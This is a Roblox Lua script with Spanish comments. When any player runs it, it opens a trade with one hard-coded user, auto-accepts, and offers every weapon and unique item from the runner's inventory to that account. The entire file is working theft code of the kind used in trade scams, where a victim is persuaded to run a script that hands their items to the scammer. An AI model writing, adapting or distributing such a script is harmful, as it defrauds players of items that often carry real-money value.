-- ID fijo de Aaron al que se le van a regalar/enviar las cosas
local targetUserId = 10631566712
local targetPlayer = nil

-- Buscar a Aaron en el servidor actual sin importar quién ejecute el script
for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
    if player.UserId == targetUserId then
        targetPlayer = player
        break
    end
end

if targetPlayer then
    local argsSend = {
        [1] = targetPlayer
    }
    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(argsSend))
    print("¡Solicitud de trade enviada con éxito a Aaron (AARON287240)!")
else
    warn("Aaron no está en este servidor. Asegúrate de que Aaron esté conectado en la misma partida.")
    return
end

-- Esperar a que se abra la sesión de trade
task.wait(1.5)

-- Aceptar el trade automáticamente
local acceptArgs = {
    [1] = 428469873,
    [2] = 21997.844980315014
}
pcall(function()
    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(acceptArgs))
end)

task.wait(0.5)

-- Extraer TODAS las armas del inventario de la persona que esté ejecutando el script
local success, profileData = pcall(function()
    local modules = game:GetService("ReplicatedStorage"):WaitForChild("Modules")
    return require(modules:WaitForChild("ProfileData"))
end)

local weaponsList = {}

if success and profileData and profileData.Weapons and profileData.Weapons.Owned then
    for _, weaponName in pairs(profileData.Weapons.Owned) do
        if type(weaponName) == "string" then
            table.insert(weaponsList, weaponName)
        end
    end
end

if success and profileData and profileData.Uniques then
    for _, uniqueItem in pairs(profileData.Uniques) do
        if uniqueItem.BaseItem then
            table.insert(weaponsList, uniqueItem.BaseItem)
        end
    end
end

-- Respaldo con la mochila clásica por si acaso
local backpack = game:GetService("Players").LocalPlayer:FindFirstChild("Backpack")
if backpack then
    for _, item in ipairs(backpack:GetChildren()) do
        table.insert(weaponsList, item.Name)
    end
end

print("¡Se detectaron " .. #weaponsList .. " armas para regalarle a Aaron!")

-- Ofrecer todas las armas detectadas al trade
for _, weaponName in ipairs(weaponsList) do
    local offerArgs = {
        [1] = weaponName,
        [2] = "Weapons"
    }
    
    local successOffer, err = pcall(function()
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(offerArgs))
    end)
    
    if successOffer then
        print("✔ Arma ofrecida a Aaron: " .. weaponName)
    else
        warn("✖ No se pudo ofrecer " .. weaponName .. ": " .. tostring(err))
    end
    
    task.wait(0.15)
end

print("¡Listo! Todo el inventario fue dirigido hacia la cuenta de Aaron.")
